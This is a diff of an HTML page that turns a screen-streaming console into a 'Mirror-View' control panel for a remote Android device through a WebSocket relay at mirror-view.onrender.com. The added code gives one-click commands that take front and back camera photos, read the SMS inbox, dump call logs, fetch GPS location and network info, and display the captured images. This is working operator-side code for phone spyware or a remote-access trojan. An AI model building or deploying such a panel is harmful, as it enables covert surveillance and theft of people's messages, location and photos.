@@ -1,279 +1,228 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mirror-View Control Panel</title>
+    <style>
+        :root {
+            --bg-dark: #0f172a;
+            --card-bg: #1e293b;
+            --accent: #38bdf8;
+            --text: #f1f5f9;
+            --success: #22c55e;
+            --danger: #ef4444;
+        }
 
-<title>SystemSync Console</title>
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
 
-<style>
+        /* Status Header */
+        .header {
+            width: 100%;
+            max-width: 900px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: var(--card-bg);
+            padding: 15px 25px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #334155;
+        }
 
-body{
-    margin:0;
-    background:#050505;
-    color:#e0e0e0;
-    font-family:Segoe UI;
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-}
+        .status-badge {
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+        }
 
-header{
-    width:100%;
-    padding:18px;
-    background:#000;
-    border-bottom:1px solid #111;
-    text-align:center;
-    font-size:22px;
-    color:#00d2ff;
-}
+        .offline { background: #450a0a; color: #f87171; border: 1px solid var(--danger); }
+        .online { background: #064e3b; color: #4ade80; border: 1px solid var(--success); }
 
-#panel{
-    margin-top:20px;
-    background:#0f0f0f;
-    padding:20px;
-    border-radius:12px;
-    border:1px solid #222;
-    width:480px;
-}
+        /* Main Layout */
+        .container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            width: 100%;
+            max-width: 900px;
+        }
 
-select,button{
-    padding:10px;
-    border:none;
-    border-radius:6px;
-    margin:6px;
-}
+        .panel {
+            background: var(--card-bg);
+            padding: 20px;
+            border-radius: 12px;
+            border: 1px solid #334155;
+        }
 
-button{
-    cursor:pointer;
-    font-weight:bold;
-}
+        /* Button Grid */
+        .controls {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
 
-.start{ background:#00d2ff; }
-.stop{ background:#ff4b2b; color:white; }
+        button {
+            background: #334155;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.2s;
+        }
 
-video{
-    margin-top:15px;
-    width:100%;
-    border-radius:10px;
-    background:black;
-}
+        button:hover { background: var(--accent); color: var(--bg-dark); }
+        .btn-capture { background: #0369a1; }
 
-.status{
-    margin-top:10px;
-    font-size:14px;
-}
+        /* Output Viewers */
+        #log-window {
+            height: 300px;
+            background: #000;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            padding: 10px;
+            overflow-y: auto;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            white-space: pre-wrap;
+        }
 
-</style>
+        #image-preview {
+            width: 100%;
+            height: 300px;
+            border-radius: 8px;
+            object-fit: contain;
+            background: #000;
+        }
+
+        h3 { margin-top: 0; color: var(--accent); font-size: 1.1rem; }
+        
+        @media (max-width: 768px) {
+            .container { grid-template-columns: 1fr; }
+        }
+    </style>
 </head>
-
 <body>
 
-<header>SystemSync Remote Console</header>
+    <div class="header">
+        <h2>Mirror-View Terminal</h2>
+        <div id="status" class="status-badge offline">Disconnected</div>
+    </div>
 
-<div id="panel">
+    <div class="container">
+        <div class="panel">
+            <h3>Device Commands</h3>
+            <div class="controls">
+                <button class="btn-capture" onclick="send('camFront')">Front Camera</button>
+                <button class="btn-capture" onclick="send('camBack')">Back Camera</button>
+                <button onclick="send('getSMS inbox')">Read SMS</button>
+                <button onclick="send('getCallLogs')">Call Logs</button>
+                <button onclick="send('getLocation')">Get GPS</button>
+                <button onclick="promptVibrate()">Vibrate</button>
+                <button onclick="send('getIP')">Network Info</button>
+                <button onclick="clearLogs()" style="grid-column: span 2; background: transparent; border: 1px solid #475569;">Clear Terminal</button>
+            </div>
+        </div>
 
-<b>Select Device</b><br>
+        <div class="panel">
+            <h3>Visual Output</h3>
+            <img id="image-preview" src="about:blank" alt="No Image Captured">
+        </div>
 
-<select id="device-selector"></select>
+        <div class="panel" style="grid-column: span 2;">
+            <h3>Console Log</h3>
+            <div id="log-window">System initialized. Waiting for connection...</div>
+        </div>
+    </div>
 
-<button onclick="connectToDevice()">CONNECT</button>
+    <script>
+        const WS_URL = "wss://mirror-view.onrender.com";
+        let socket;
 
-<br><br>
+        function connect() {
+            socket = new WebSocket(WS_URL);
 
-<button class="start" onclick="sendCommand('START_SCREEN')">
-START STREAM
-</button>
+            socket.onopen = () => {
+                log("Connected to relay server.");
+                socket.send("I_AM_WEB");
+            };
 
-<button class="stop" onclick="sendCommand('STOP_SCREEN')">
-STOP STREAM
-</button>
+            socket.onmessage = (event) => {
+                const data = event.data;
 
-<video id="screen-display" autoplay playsinline></video>
-
-<div id="status" class="status">Connecting...</div>
-
-</div>
-
-<script>
-
-const SERVER = "wss://mirror-view.onrender.com";
-
-let socket;
-let pc;
-let selectedDevice = null;
-let pendingIce = [];
-
-// 🔥 AUTO CONNECT
-connectSocket();
-
-function connectSocket(){
-
-    socket = new WebSocket(SERVER);
-
-    socket.onopen = () => {
-
-        updateStatus("Connected to signaling");
-
-        socket.send(JSON.stringify({
-            type:"REGISTER_CONTROLLER"
-        }));
-    };
-
-    socket.onclose = () => {
-
-        updateStatus("Reconnecting...");
-        setTimeout(connectSocket,3000);
-    };
-
-    socket.onerror = () => {
-        socket.close();
-    };
-
-    socket.onmessage = async (event)=>{
-
-        const msg = JSON.parse(event.data);
-
-        switch(msg.type){
-
-            case "DEVICE_LIST":
-                populateDevices(msg.devices);
-                break;
-
-            case "OFFER":
-
-                await createPeer();
-
-                await pc.setRemoteDescription(
-                    new RTCSessionDescription(msg)
-                );
-
-                // 🔥 Apply queued ICE
-                pendingIce.forEach(c=>pc.addIceCandidate(c));
-                pendingIce = [];
-
-                const answer = await pc.createAnswer();
-                await pc.setLocalDescription(answer);
-
-                socket.send(JSON.stringify({
-                    type:"ANSWER",
-                    sdp:answer.sdp,
-                    deviceId:selectedDevice
-                }));
-
-                break;
-
-            case "ICE":
-
-                if(pc && pc.remoteDescription){
-                    pc.addIceCandidate(msg.candidate);
-                }else{
-                    pendingIce.push(msg.candidate);
+                // Handle Status Updates
+                if (data.startsWith("STATUS:")) {
+                    const status = data.split(":")[1];
+                    updateStatus(status);
+                    return;
                 }
 
-                break;
+                // Handle Image Data (Detects Base64 header or long strings)
+                if (data.length > 1000 || data.includes("/9j/")) {
+                    document.getElementById('image-preview').src = "data:image/jpeg;base64," + data.replace("END123\n", "");
+                    log("Image data received and rendered.");
+                } else {
+                    // Handle Standard Text Logs
+                    log("DEVICE: " + data.replace("END123\n", ""));
+                }
+            };
+
+            socket.onclose = () => {
+                updateStatus("OFFLINE");
+                log("Socket closed. Retrying in 5 seconds...");
+                setTimeout(connect, 5000);
+            };
+
+            socket.onerror = (err) => {
+                log("WebSocket Error detected.");
+            };
         }
-    };
-}
 
-// --------------------
-
-function populateDevices(devices){
-
-    const selector =
-        document.getElementById("device-selector");
-
-    selector.innerHTML="";
-
-    devices.forEach(d=>{
-
-        const opt=document.createElement("option");
-
-        opt.value=d.id;
-        opt.text=d.name;
-
-        selector.appendChild(opt);
-    });
-}
-
-// --------------------
-
-function connectToDevice(){
-
-    selectedDevice =
-        document.getElementById("device-selector").value;
-
-    socket.send(JSON.stringify({
-        type:"SELECT_DEVICE",
-        deviceId:selectedDevice
-    }));
-
-    updateStatus("Device selected");
-}
-
-// --------------------
-
-async function createPeer(){
-
-    pc = new RTCPeerConnection({
-
-        iceServers:[
-            {urls:"stun:stun.l.google.com:19302"}
-        ]
-    });
-
-    pc.ontrack = e => {
-
-        document
-            .getElementById("screen-display")
-            .srcObject = e.streams[0];
-
-        updateStatus("Streaming LIVE");
-    };
-
-    pc.onicecandidate = e => {
-
-        if(e.candidate){
-
-            socket.send(JSON.stringify({
-                type:"ICE",
-                candidate:e.candidate,
-                deviceId:selectedDevice
-            }));
+        function send(command) {
+            if (socket && socket.readyState === WebSocket.OPEN) {
+                socket.send(command);
+                log("Sent command: " + command);
+            } else {
+                alert("Not connected to server!");
+            }
         }
-    };
 
-    pc.onconnectionstatechange = () => {
-
-        if(pc.connectionState==="disconnected"){
-            updateStatus("Stream disconnected");
+        function promptVibrate() {
+            const count = prompt("Enter vibration count:", "3");
+            if (count) send("vibrate " + count);
         }
-    };
-}
 
-// --------------------
+        function log(msg) {
+            const win = document.getElementById('log-window');
+            win.innerText += `\n[${new Date().toLocaleTimeString()}] ${msg}`;
+            win.scrollTop = win.scrollHeight;
+        }
 
-function sendCommand(cmd){
+        function updateStatus(status) {
+            const badge = document.getElementById('status');
+            badge.innerText = status;
+            badge.className = "status-badge " + status.toLowerCase();
+        }
 
-    if(!selectedDevice){
-        alert("Select a device first!");
-        return;
-    }
+        function clearLogs() {
+            document.getElementById('log-window').innerText = "Logs cleared.";
+        }
 
-    socket.send(JSON.stringify({
-        type:"COMMAND",
-        command:cmd,
-        deviceId:selectedDevice
-    }));
-}
-
-// --------------------
-
-function updateStatus(text){
-    document.getElementById("status").innerText = text;
-}
-
-</script>
-
+        // Initialize connection on load
+        connect();
+    </script>
 </body>
 </html>
